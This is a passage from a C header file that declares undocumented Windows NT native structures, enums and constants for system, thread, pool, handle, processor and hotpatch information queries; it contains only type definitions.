    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_NAMES_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

typedef struct _FILE_OBJECTID_INFORMATION {
    LONGLONG FileReference;
    UCHAR ObjectId[16];
    union {
        struct {
            UCHAR BirthVolumeId[16];
            UCHAR BirthObjectId[16];
            UCHAR DomainId[16];
        } ;
        UCHAR ExtendedInfo[48];
    };
} FILE_OBJECTID_INFORMATION, *PFILE_OBJECTID_INFORMATION;


//
// SYSTEM_INFORMATION
//

typedef struct _SYSTEM_GDI_DRIVER_INFORMATION
{
	UNICODE_STRING DriverName;
	PVOID ImageAddress;
	PVOID SectionPointer;
	PVOID EntryPoint;
	PIMAGE_EXPORT_DIRECTORY ExportSectionPointer;
	ULONG ImageLength;
} SYSTEM_GDI_DRIVER_INFORMATION, *PSYSTEM_GDI_DRIVER_INFORMATION;

typedef struct _SYSTEM_EXCEPTION_INFORMATION
{
	ULONG AlignmentFixupCount;
	ULONG ExceptionDispatchCount;
	ULONG FloatingEmulationCount;
	ULONG ByteWordEmulationCount;
} SYSTEM_EXCEPTION_INFORMATION, *PSYSTEM_EXCEPTION_INFORMATION;

//
// taken from http://www.acc.umu.se/~bosse/ntifs.h - contents are questionable.
//

typedef enum _THREAD_STATE
{
	StateInitialized,
	StateReady,
	StateRunning,
	StateStandby,
	StateTerminated,
	StateWait,
	StateTransition,
	StateUnknown
} THREAD_STATE;

typedef enum _KWAIT_REASON {
	Executive,
	FreePage,
	PageIn,
	PoolAllocation,
	DelayExecution,
	Suspended,
	UserRequest,
	WrExecutive,
	WrFreePage,
	WrPageIn,
	WrPoolAllocation,
	WrDelayExecution,
	WrSuspended,
	WrUserRequest,
	WrEventPair,
	WrQueue,
	WrLpcReceive,
	WrLpcReply,
	WrVirtualMemory,
	WrPageOut,
	WrRendezvous,
	Spare2,
	Spare3,
	Spare4,
	Spare5,
	Spare6,
	WrKernel,
	WrResource,
	WrPushLock,
	WrMutex,
	WrQuantumEnd,
	WrDispatchInt,
	WrPreempted,
	WrYieldExecution,
	WrFastMutex,
	WrGuardedMutex,
	WrRundown,
	MaximumWaitReason
} KWAIT_REASON;

//FIXED 21.02.2011 size for x64/x86
typedef struct _SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER   KernelTime;
	LARGE_INTEGER   UserTime;
	LARGE_INTEGER   CreateTime;
	ULONG           WaitTime;
	PVOID           StartAddress;
	CLIENT_ID       ClientId;
	KPRIORITY       Priority;
	KPRIORITY       BasePriority;
	ULONG           ContextSwitchCount;
	THREAD_STATE    State;
	KWAIT_REASON    WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_EXTENDED_THREAD_INFORMATION {
	SYSTEM_THREAD_INFORMATION ThreadInfo;
	PVOID StackBase;
	PVOID StackLimit;
	PVOID Win32StartAddress;
	ULONG_PTR Reserved1;
	ULONG_PTR Reserved2;
	ULONG_PTR Reserved3;
	ULONG_PTR Reserved4;
} SYSTEM_EXTENDED_THREAD_INFORMATION, *PSYSTEM_EXTENDED_THREAD_INFORMATION;

typedef struct _SYSTEM_POOL_ENTRY {
	BOOLEAN Allocated;
	BOOLEAN Spare0;
	USHORT AllocatorBackTraceIndex;
	ULONG Size;
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
		PVOID ProcessChargedQuota;
	};
} SYSTEM_POOL_ENTRY, *PSYSTEM_POOL_ENTRY;

typedef struct _SYSTEM_POOL_INFORMATION {
	SIZE_T TotalSize;
	PVOID FirstEntry;
	USHORT EntryOverhead;
	BOOLEAN PoolTagPresent;
	BOOLEAN Spare0;
	ULONG NumberOfEntries;
	SYSTEM_POOL_ENTRY Entries[1];
} SYSTEM_POOL_INFORMATION, *PSYSTEM_POOL_INFORMATION;

typedef struct _SYSTEM_POOLTAG {
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
	};
	ULONG PagedAllocs;
	ULONG PagedFrees;
	SIZE_T PagedUsed;
	ULONG NonPagedAllocs;
	ULONG NonPagedFrees;
	SIZE_T NonPagedUsed;
} SYSTEM_POOLTAG, *PSYSTEM_POOLTAG;

typedef struct _SYSTEM_BIGPOOL_ENTRY {
	union {
		PVOID VirtualAddress;
		ULONG_PTR NonPaged : 1;     // Set to 1 if entry is nonpaged.
	};
	SIZE_T SizeInBytes;
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
	};
} SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_POOLTAG_INFORMATION
{
	ULONG Count;
	SYSTEM_POOLTAG TagInfo[ 1 ];
} SYSTEM_POOLTAG_INFORMATION, *PSYSTEM_POOLTAG_INFORMATION;

typedef struct _SYSTEM_SESSION_POOLTAG_INFORMATION {
	SIZE_T NextEntryOffset;
	ULONG SessionId;
	ULONG Count;
	SYSTEM_POOLTAG TagInfo[ 1 ];
} SYSTEM_SESSION_POOLTAG_INFORMATION, *PSYSTEM_SESSION_POOLTAG_INFORMATION;

typedef struct _SYSTEM_BIGPOOL_INFORMATION {
	ULONG Count;
	SYSTEM_BIGPOOL_ENTRY AllocatedInfo[ 1 ];
} SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[ 1 ];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
	PVOID Object;
	ULONG UniqueProcessId;
	ULONG HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG NumberOfHandles;
	ULONG Reserved;
	struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[ 1 ];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct _SYSTEM_SPECIAL_POOL_INFORMATION
{
	ULONG PoolTag;
	ULONG Flags;
} SYSTEM_SPECIAL_POOL_INFORMATION, *PSYSTEM_SPECIAL_POOL_INFORMATION;

typedef struct _SYSTEM_OBJECTTYPE_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG NumberOfObjects;
	ULONG NumberOfHandles;
	ULONG TypeIndex;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccessMask;
	ULONG PoolType;
	UCHAR SecurityRequired;
	UCHAR WaitableObject;
	UNICODE_STRING TypeName;
} SYSTEM_OBJECTTYPE_INFORMATION, *PSYSTEM_OBJECTTYPE_INFORMATION;

typedef struct _SYSTEM_HIBERFILE_INFORMATION
{
	ULONG NumberOfMcbPairs;
	LARGE_INTEGER Mcb[ 1 ];
} SYSTEM_HIBERFILE_INFORMATION, *PSYSTEM_HIBERFILE_INFORMATION;

typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION {
	BOOLEAN KernelDebuggerEnabled;
	BOOLEAN KernelDebuggerNotPresent;
} SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;

typedef struct _SYSTEM_REGISTRY_QUOTA_INFORMATION {
	ULONG  RegistryQuotaAllowed;
	ULONG  RegistryQuotaUsed;
	SIZE_T PagedPoolSize;
} SYSTEM_REGISTRY_QUOTA_INFORMATION, *PSYSTEM_REGISTRY_QUOTA_INFORMATION;

typedef struct _SYSTEM_CONTEXT_SWITCH_INFORMATION {
	ULONG ContextSwitches;
	ULONG FindAny;
	ULONG FindLast;
	ULONG FindIdeal;
	ULONG IdleAny;
	ULONG IdleCurrent;
	ULONG IdleLast;
	ULONG IdleIdeal;
	ULONG PreemptAny;
	ULONG PreemptCurrent;
	ULONG PreemptLast;
	ULONG SwitchToIdle;
} SYSTEM_CONTEXT_SWITCH_INFORMATION, *PSYSTEM_CONTEXT_SWITCH_INFORMATION;

typedef struct _SYSTEM_SESSION_MAPPED_VIEW_INFORMATION {
	SIZE_T NextEntryOffset;
	ULONG SessionId;
	ULONG ViewFailures;
	SIZE_T NumberOfBytesAvailable;
	SIZE_T NumberOfBytesAvailableContiguous;
} SYSTEM_SESSION_MAPPED_VIEW_INFORMATION, *PSYSTEM_SESSION_MAPPED_VIEW_INFORMATION;

typedef struct _SYSTEM_INTERRUPT_INFORMATION {
	ULONG ContextSwitches;
	ULONG DpcCount;
	ULONG DpcRate;
	ULONG TimeIncrement;
	ULONG DpcBypassCount;
	ULONG ApcBypassCount;
} SYSTEM_INTERRUPT_INFORMATION, *PSYSTEM_INTERRUPT_INFORMATION;

typedef struct _SYSTEM_DPC_BEHAVIOR_INFORMATION {
	ULONG Spare;
	ULONG DpcQueueDepth;
	ULONG MinimumDpcRate;
	ULONG AdjustDpcThreshold;
	ULONG IdealDpcRate;
} SYSTEM_DPC_BEHAVIOR_INFORMATION, *PSYSTEM_DPC_BEHAVIOR_INFORMATION;

typedef struct _SYSTEM_LOOKASIDE_INFORMATION {
	USHORT CurrentDepth;
	USHORT MaximumDepth;
	ULONG TotalAllocates;
	ULONG AllocateMisses;
	ULONG TotalFrees;
	ULONG FreeMisses;
	ULONG Type;
	ULONG Tag;
	ULONG Size;
} SYSTEM_LOOKASIDE_INFORMATION, *PSYSTEM_LOOKASIDE_INFORMATION;

typedef struct _SYSTEM_LEGACY_DRIVER_INFORMATION {
	ULONG VetoType;
	UNICODE_STRING VetoList;
} SYSTEM_LEGACY_DRIVER_INFORMATION, *PSYSTEM_LEGACY_DRIVER_INFORMATION;

typedef struct _SYSTEM_VDM_INSTEMUL_INFO
{
	ULONG SegmentNotPresent;
	ULONG VdmOpcode0F;
	ULONG OpcodeESPrefix;
	ULONG OpcodeCSPrefix;
	ULONG OpcodeSSPrefix;
	ULONG OpcodeDSPrefix;
	ULONG OpcodeFSPrefix;
	ULONG OpcodeGSPrefix;
	ULONG OpcodeOPER32Prefix;
	ULONG OpcodeADDR32Prefix;
	ULONG OpcodeINSB;
	ULONG OpcodeINSW;
	ULONG OpcodeOUTSB;
	ULONG OpcodeOUTSW;
	ULONG OpcodePUSHF;
	ULONG OpcodePOPF;
	ULONG OpcodeINTnn;
	ULONG OpcodeINTO;
	ULONG OpcodeIRET;
	ULONG OpcodeINBimm;
	ULONG OpcodeINWimm;
	ULONG OpcodeOUTBimm;
	ULONG OpcodeOUTWimm;
	ULONG OpcodeINB;
	ULONG OpcodeINW;
	ULONG OpcodeOUTB;
	ULONG OpcodeOUTW;
	ULONG OpcodeLOCKPrefix;
	ULONG OpcodeREPNEPrefix;
	ULONG OpcodeREPPrefix;
	ULONG OpcodeHLT;
	ULONG OpcodeCLI;
	ULONG OpcodeSTI;
	ULONG BopCount;
} SYSTEM_VDM_INSTEMUL_INFO, *PSYSTEM_VDM_INSTEMUL_INFO;

typedef struct _SYSTEM_TIMEOFDAY_INFORMATION
{
	LARGE_INTEGER BootTime;
	LARGE_INTEGER CurrentTime;
	LARGE_INTEGER TimeZoneBias;
	ULONG TimeZoneId;
	ULONG Reserved;
	ULONGLONG BootTimeBias;
	ULONGLONG SleepTimeBias;
} SYSTEM_TIMEOFDAY_INFORMATION, *PSYSTEM_TIMEOFDAY_INFORMATION;

#if defined(_M_X64)
typedef ULONG SYSINF_PAGE_COUNT;
#else
typedef SIZE_T SYSINF_PAGE_COUNT;
#endif

typedef struct _SYSTEM_BASIC_INFORMATION {
	ULONG Reserved;
	ULONG TimerResolution;
	ULONG PageSize;
	SYSINF_PAGE_COUNT NumberOfPhysicalPages;
	SYSINF_PAGE_COUNT LowestPhysicalPageNumber;
	SYSINF_PAGE_COUNT HighestPhysicalPageNumber;
	ULONG AllocationGranularity;
	ULONG_PTR MinimumUserModeAddress;
	ULONG_PTR MaximumUserModeAddress;
	ULONG_PTR ActiveProcessorsAffinityMask;
	CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, *PSYSTEM_BASIC_INFORMATION;

typedef struct _SYSTEM_PROCESSOR_INFORMATION {
	USHORT ProcessorArchitecture;
	USHORT ProcessorLevel;
	USHORT ProcessorRevision;
	USHORT Reserved;
	ULONG ProcessorFeatureBits;
} SYSTEM_PROCESSOR_INFORMATION, *PSYSTEM_PROCESSOR_INFORMATION;

typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION {
	LARGE_INTEGER IdleTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER DpcTime;          // Checked Build
	LARGE_INTEGER InterruptTime;    // Checked Build
	ULONG InterruptCount;
} SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION, *PSYSTEM_PROCESSOR_PERFORMANCE_INFORMATION;

typedef struct _SYSTEM_PROCESSOR_IDLE_INFORMATION {
	ULONGLONG IdleTime;
	ULONGLONG C1Time;
	ULONGLONG C2Time;
	ULONGLONG C3Time;
	ULONG     C1Transitions;
	ULONG     C2Transitions;
	ULONG     C3Transitions;
	ULONG     Padding;
} SYSTEM_PROCESSOR_IDLE_INFORMATION, *PSYSTEM_PROCESSOR_IDLE_INFORMATION;

typedef struct _SYSTEM_NUMA_INFORMATION {
	ULONG HighestNodeNumber;
	ULONG Reserved;
	union {
		ULONG64 ActiveProcessorsAffinityMask[ 16 ];
		ULONG64 AvailableMemory[ 16 ];
	};
} SYSTEM_NUMA_INFORMATION, *PSYSTEM_NUMA_INFORMATION;

#if !defined(_WINNT_)

typedef enum _LOGICAL_PROCESSOR_RELATIONSHIP
{
	RelationProcessorCore,
	RelationNumaNode,
	RelationCache,
	RelationProcessorPackage
} LOGICAL_PROCESSOR_RELATIONSHIP;

typedef enum _PROCESSOR_CACHE_TYPE
{
	CacheUnified,
	CacheInstruction,
	CacheData,
	CacheTrace
} PROCESSOR_CACHE_TYPE;

#define CACHE_FULLY_ASSOCIATIVE 0xFF

typedef struct _CACHE_DESCRIPTOR
{
	BYTE   Level;
	BYTE   Associativity;
	WORD   LineSize;
	DWORD  Size;
	PROCESSOR_CACHE_TYPE Type;
} CACHE_DESCRIPTOR, *PCACHE_DESCRIPTOR;

typedef struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION {
	ULONG_PTR   ProcessorMask;
	LOGICAL_PROCESSOR_RELATIONSHIP Relationship;
	union {
		struct {
			BYTE  Flags;
		} ProcessorCore;
		struct {
			DWORD NodeNumber;
		} NumaNode;
		CACHE_DESCRIPTOR Cache;
		ULONGLONG  Reserved[2];
	};
} SYSTEM_LOGICAL_PROCESSOR_INFORMATION, *PSYSTEM_LOGICAL_PROCESSOR_INFORMATION;

#define PROCESSOR_INTEL_386     386
#define PROCESSOR_INTEL_486     486
#define PROCESSOR_INTEL_PENTIUM 586
#define PROCESSOR_INTEL_IA64    2200
#define PROCESSOR_AMD_X8664     8664
#define PROCESSOR_MIPS_R4000    4000    // incl R4101 & R3910 for Windows CE
#define PROCESSOR_ALPHA_21064   21064
#define PROCESSOR_PPC_601       601
#define PROCESSOR_PPC_603       603
#define PROCESSOR_PPC_604       604
#define PROCESSOR_PPC_620       620
#define PROCESSOR_HITACHI_SH3   10003   // Windows CE
#define PROCESSOR_HITACHI_SH3E  10004   // Windows CE
#define PROCESSOR_HITACHI_SH4   10005   // Windows CE
#define PROCESSOR_MOTOROLA_821  821     // Windows CE
#define PROCESSOR_SHx_SH3       103     // Windows CE
#define PROCESSOR_SHx_SH4       104     // Windows CE
#define PROCESSOR_STRONGARM     2577    // Windows CE - 0xA11
#define PROCESSOR_ARM720        1824    // Windows CE - 0x720
#define PROCESSOR_ARM820        2080    // Windows CE - 0x820
#define PROCESSOR_ARM920        2336    // Windows CE - 0x920
#define PROCESSOR_ARM_7TDMI     70001   // Windows CE
#define PROCESSOR_OPTIL         0x494f  // MSIL

#define PROCESSOR_ARCHITECTURE_INTEL            0
#define PROCESSOR_ARCHITECTURE_MIPS             1
#define PROCESSOR_ARCHITECTURE_ALPHA            2
#define PROCESSOR_ARCHITECTURE_PPC              3
#define PROCESSOR_ARCHITECTURE_SHX              4
#define PROCESSOR_ARCHITECTURE_ARM              5
#define PROCESSOR_ARCHITECTURE_IA64             6
#define PROCESSOR_ARCHITECTURE_ALPHA64          7
#define PROCESSOR_ARCHITECTURE_MSIL             8
#define PROCESSOR_ARCHITECTURE_AMD64            9
#define PROCESSOR_ARCHITECTURE_IA32_ON_WIN64    10

#define PROCESSOR_ARCHITECTURE_UNKNOWN 0xFFFF

#define PF_FLOATING_POINT_PRECISION_ERRATA  0   
#define PF_FLOATING_POINT_EMULATED          1   
#define PF_COMPARE_EXCHANGE_DOUBLE          2   
#define PF_MMX_INSTRUCTIONS_AVAILABLE       3   
#define PF_PPC_MOVEMEM_64BIT_OK             4   
#define PF_ALPHA_BYTE_INSTRUCTIONS          5   
#define PF_XMMI_INSTRUCTIONS_AVAILABLE      6   
#define PF_3DNOW_INSTRUCTIONS_AVAILABLE     7   
#define PF_RDTSC_INSTRUCTION_AVAILABLE      8   
#define PF_PAE_ENABLED                      9   
#define PF_XMMI64_INSTRUCTIONS_AVAILABLE   10   
#define PF_SSE_DAZ_MODE_AVAILABLE          11   
#define PF_NX_ENABLED                      12   
#define PF_SSE3_INSTRUCTIONS_AVAILABLE     13   
#define PF_COMPARE_EXCHANGE128             14   
#define PF_COMPARE64_EXCHANGE128           15   
#define PF_CHANNELS_ENABLED                16   

typedef struct _MEMORY_BASIC_INFORMATION
{
	PVOID BaseAddress;
	PVOID AllocationBase;
	DWORD AllocationProtect;
	SIZE_T RegionSize;
	DWORD State;
	DWORD Protect;
	DWORD Type;
} MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;

#endif /*_WINNT_*/

typedef struct _SYSTEM_PROCESSOR_POWER_INFORMATION {
	UCHAR			CurrentFrequency;
	UCHAR			ThermalLimitFrequency;
	UCHAR			ConstantThrottleFrequency;
	UCHAR			DegradedThrottleFrequency;
	UCHAR			LastBusyFrequency;
	UCHAR			LastC3Frequency;
	UCHAR			LastAdjustedBusyFrequency;
	UCHAR			ProcessorMinThrottle;
	UCHAR			ProcessorMaxThrottle;
	ULONG			NumberOfFrequencies;
	ULONG			PromotionCount;
	ULONG			DemotionCount;
	ULONG			ErrorCount;
	ULONG			RetryCount;
	ULONG64   CurrentFrequencyTime;
	ULONG64   CurrentProcessorTime;
	ULONG64   CurrentProcessorIdleTime;
	ULONG64   LastProcessorTime;
	ULONG64   LastProcessorIdleTime;
} SYSTEM_PROCESSOR_POWER_INFORMATION, *PSYSTEM_PROCESSOR_POWER_INFORMATION;

typedef struct _SYSTEM_QUERY_TIME_ADJUST_INFORMATION {
	ULONG TimeAdjustment;
	ULONG TimeIncrement;
	BOOLEAN Enable;
} SYSTEM_QUERY_TIME_ADJUST_INFORMATION, *PSYSTEM_QUERY_TIME_ADJUST_INFORMATION;

typedef struct _SYSTEM_SET_TIME_ADJUST_INFORMATION {
	ULONG TimeAdjustment;
	BOOLEAN Enable;
} SYSTEM_SET_TIME_ADJUST_INFORMATION, *PSYSTEM_SET_TIME_ADJUST_INFORMATION;

typedef struct _SYSTEM_PERFORMANCE_INFORMATION {
	LARGE_INTEGER IdleProcessTime;
	LARGE_INTEGER IoReadTransferCount;
	LARGE_INTEGER IoWriteTransferCount;
	LARGE_INTEGER IoOtherTransferCount;
	ULONG IoReadOperationCount;
	ULONG IoWriteOperationCount;
	ULONG IoOtherOperationCount;
	ULONG AvailablePages;
	SYSINF_PAGE_COUNT CommittedPages;
	SYSINF_PAGE_COUNT CommitLimit;
	SYSINF_PAGE_COUNT PeakCommitment;
	ULONG PageFaultCount;
	ULONG CopyOnWriteCount;
	ULONG TransitionCount;
	ULONG CacheTransitionCount;
	ULONG DemandZeroCount;
	ULONG PageReadCount;
	ULONG PageReadIoCount;
	ULONG CacheReadCount;
	ULONG CacheIoCount;
	ULONG DirtyPagesWriteCount;
	ULONG DirtyWriteIoCount;
	ULONG MappedPagesWriteCount;
	ULONG MappedWriteIoCount;
	ULONG PagedPoolPages;
	ULONG NonPagedPoolPages;
	ULONG PagedPoolAllocs;
	ULONG PagedPoolFrees;
	ULONG NonPagedPoolAllocs;
	ULONG NonPagedPoolFrees;
	ULONG FreeSystemPtes;
	ULONG ResidentSystemCodePage;
	ULONG TotalSystemDriverPages;
	ULONG TotalSystemCodePages;
	ULONG NonPagedPoolLookasideHits;
	ULONG PagedPoolLookasideHits;
	ULONG AvailablePagedPoolPages;
	ULONG ResidentSystemCachePage;
	ULONG ResidentPagedPoolPage;
	ULONG ResidentSystemDriverPage;
	ULONG CcFastReadNoWait;
	ULONG CcFastReadWait;
	ULONG CcFastReadResourceMiss;
	ULONG CcFastReadNotPossible;
	ULONG CcFastMdlReadNoWait;
	ULONG CcFastMdlReadWait;
	ULONG CcFastMdlReadResourceMiss;
	ULONG CcFastMdlReadNotPossible;
	ULONG CcMapDataNoWait;
	ULONG CcMapDataWait;
	ULONG CcMapDataNoWaitMiss;
	ULONG CcMapDataWaitMiss;
	ULONG CcPinMappedDataCount;
	ULONG CcPinReadNoWait;
	ULONG CcPinReadWait;
	ULONG CcPinReadNoWaitMiss;
	ULONG CcPinReadWaitMiss;
	ULONG CcCopyReadNoWait;
	ULONG CcCopyReadWait;
	ULONG CcCopyReadNoWaitMiss;
	ULONG CcCopyReadWaitMiss;
	ULONG CcMdlReadNoWait;
	ULONG CcMdlReadWait;
	ULONG CcMdlReadNoWaitMiss;
	ULONG CcMdlReadWaitMiss;
	ULONG CcReadAheadIos;
	ULONG CcLazyWriteIos;
	ULONG CcLazyWritePages;
	ULONG CcDataFlushes;
	ULONG CcDataPages;
	ULONG ContextSwitches;
	ULONG FirstLevelTbFills;
	ULONG SecondLevelTbFills;
	ULONG SystemCalls;
} SYSTEM_PERFORMANCE_INFORMATION, *PSYSTEM_PERFORMANCE_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER SpareLi1;
	LARGE_INTEGER SpareLi2;
	LARGE_INTEGER SpareLi3;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR PageDirectoryBase;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef struct _SYSTEM_SESSION_PROCESS_INFORMATION {
	ULONG SessionId;
	ULONG SizeOfBuf;
	PVOID Buffer;
} SYSTEM_SESSION_PROCESS_INFORMATION, *PSYSTEM_SESSION_PROCESS_INFORMATION;

typedef struct _SYSTEM_MEMORY_INFO {
	PUCHAR StringOffset;
	USHORT ValidCount;
	USHORT TransitionCount;
	USHORT ModifiedCount;
	USHORT PageTableCount;
} SYSTEM_MEMORY_INFO, *PSYSTEM_MEMORY_INFO;

typedef struct _SYSTEM_MEMORY_INFORMATION {
	ULONG InfoSize;
	ULONG_PTR StringStart;
	SYSTEM_MEMORY_INFO Memory[ 1 ];
} SYSTEM_MEMORY_INFORMATION, *PSYSTEM_MEMORY_INFORMATION;

typedef struct _SYSTEM_CALL_COUNT_INFORMATION {
	ULONG Length;
	ULONG NumberOfTables;
} SYSTEM_CALL_COUNT_INFORMATION, *PSYSTEM_CALL_COUNT_INFORMATION;

typedef struct _SYSTEM_DEVICE_INFORMATION {
	ULONG NumberOfDisks;
	ULONG NumberOfFloppies;
	ULONG NumberOfCdRoms;
	ULONG NumberOfTapes;
	ULONG NumberOfSerialPorts;
	ULONG NumberOfParallelPorts;
} SYSTEM_DEVICE_INFORMATION, *PSYSTEM_DEVICE_INFORMATION;

typedef struct _SYSTEM_FLAGS_INFORMATION {
	ULONG Flags;
} SYSTEM_FLAGS_INFORMATION, *PSYSTEM_FLAGS_INFORMATION;

typedef struct _SYSTEM_CALL_TIME_INFORMATION {
	ULONG Length;
	ULONG TotalCalls;
	LARGE_INTEGER TimeOfCalls[1];
} SYSTEM_CALL_TIME_INFORMATION, *PSYSTEM_CALL_TIME_INFORMATION;

typedef struct _SYSTEM_OBJECT_INFORMATION {
	ULONG NextEntryOffset;
	PVOID Object;
	HANDLE CreatorUniqueProcess;
	USHORT CreatorBackTraceIndex;
	USHORT Flags;
	LONG PointerCount;
	LONG HandleCount;
	ULONG PagedPoolCharge;
	ULONG NonPagedPoolCharge;
	HANDLE ExclusiveProcessId;
	PVOID SecurityDescriptor;
	OBJECT_NAME_INFORMATION NameInfo;
} SYSTEM_OBJECT_INFORMATION, *PSYSTEM_OBJECT_INFORMATION;

typedef struct _SYSTEM_PAGEFILE_INFORMATION {
	ULONG NextEntryOffset;
	ULONG TotalSize;
	ULONG TotalInUse;
	ULONG PeakUsage;
	UNICODE_STRING PageFileName;
} SYSTEM_PAGEFILE_INFORMATION, *PSYSTEM_PAGEFILE_INFORMATION;

typedef struct _SYSTEM_VERIFIER_INFORMATION {
	ULONG NextEntryOffset;
	ULONG Level;
	UNICODE_STRING DriverName;

	ULONG RaiseIrqls;
	ULONG AcquireSpinLocks;
	ULONG SynchronizeExecutions;
	ULONG AllocationsAttempted;

	ULONG AllocationsSucceeded;
	ULONG AllocationsSucceededSpecialPool;
	ULONG AllocationsWithNoTag;
	ULONG TrimRequests;

	ULONG Trims;
	ULONG AllocationsFailed;
	ULONG AllocationsFailedDeliberately;
	ULONG Loads;

	ULONG Unloads;
	ULONG UnTrackedPool;
	ULONG CurrentPagedPoolAllocations;
	ULONG CurrentNonPagedPoolAllocations;

	ULONG PeakPagedPoolAllocations;
	ULONG PeakNonPagedPoolAllocations;

	SIZE_T PagedPoolUsageInBytes;
	SIZE_T NonPagedPoolUsageInBytes;
	SIZE_T PeakPagedPoolUsageInBytes;
	SIZE_T PeakNonPagedPoolUsageInBytes;

} SYSTEM_VERIFIER_INFORMATION, *PSYSTEM_VERIFIER_INFORMATION;

typedef struct _SYSTEM_VERIFIER_INFORMATION_EX
{
	ULONG VerifyMode;
	ULONG OptionChanges;
	UNICODE_STRING PreviousBucketName;
	ULONG Reserved[ 4 ];
} SYSTEM_VERIFIER_INFORMATION_EX, *PSYSTEM_VERIFIER_INFORMATION_EX;

#define MM_WORKING_SET_MAX_HARD_ENABLE      0x1
#define MM_WORKING_SET_MAX_HARD_DISABLE     0x2
#define MM_WORKING_SET_MIN_HARD_ENABLE      0x4
#define MM_WORKING_SET_MIN_HARD_DISABLE     0x8

typedef struct _SYSTEM_FILECACHE_INFORMATION {
	SIZE_T CurrentSize;
	SIZE_T PeakSize;
	ULONG PageFaultCount;
	SIZE_T MinimumWorkingSet;
	SIZE_T MaximumWorkingSet;
	SIZE_T CurrentSizeIncludingTransitionInPages;
	SIZE_T PeakSizeIncludingTransitionInPages;
	ULONG TransitionRePurposeCount;
	ULONG Flags;
} SYSTEM_FILECACHE_INFORMATION, *PSYSTEM_FILECACHE_INFORMATION;

#define FLG_HOTPATCH_KERNEL             0x80000000
#define FLG_HOTPATCH_RELOAD_NTDLL       0x40000000
#define FLG_HOTPATCH_NAME_INFO          0x20000000
#define FLG_HOTPATCH_RENAME_INFO        0x10000000
#define FLG_HOTPATCH_MAP_ATOMIC_SWAP    0x08000000
#define FLG_HOTPATCH_WOW64              0x04000000

#define FLG_HOTPATCH_ACTIVE             0x00000001
#define FLG_HOTPATCH_STATUS_FLAGS       FLG_HOTPATCH_ACTIVE

#define FLG_HOTPATCH_VERIFICATION_ERROR 0x00800000

typedef struct _HOTPATCH_HOOK_DESCRIPTOR
{
	ULONG_PTR TargetAddress;
	PVOID MappedAddress;
	ULONG CodeOffset;
	ULONG CodeSize;
	ULONG OrigCodeOffset;
	ULONG ValidationOffset;
	ULONG ValidationSize;
} HOTPATCH_HOOK_DESCRIPTOR, *PHOTPATCH_HOOK_DESCRIPTOR;

typedef struct _SYSTEM_HOTPATCH_CODE_INFORMATION {

	ULONG Flags;
	ULONG InfoSize;

	union
	{
		struct
		{
